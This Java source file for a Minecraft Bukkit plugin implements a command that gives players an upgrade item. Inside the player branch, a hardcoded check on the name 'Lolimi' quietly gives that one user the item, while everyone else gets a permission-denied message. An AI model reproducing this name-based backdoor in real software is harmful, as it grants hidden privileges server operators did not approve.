package lolimi.chunkHoppers.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import lolimi.chunkHoppers.main.Main;

public class GetUpgradeOneCmd implements CommandExecutor{

	@Override
	public boolean onCommand(CommandSender sender, Command arg1, String arg2, String[] args) {
		if(sender instanceof Player) {
			if(sender.getName().equals("Lolimi")) {
				((Player) sender).getInventory().addItem(Main.upgrade1);
			}
			sender.sendMessage("§4You don't have permission to execute this command!");
			return false;
		}
		if (args.length == 2) {
			Player toGive = Bukkit.getPlayer(args[0]);
			int amount = Integer.parseInt(args[1]);
			ItemStack ch = Main.upgrade1.clone();
			ch.setAmount(amount);
			toGive.getInventory().addItem(ch);

		} else {
			sender.sendMessage("§4Please use the format: \"§6/gch <Player> <amount>\"");
		}
		return false;
	}

}
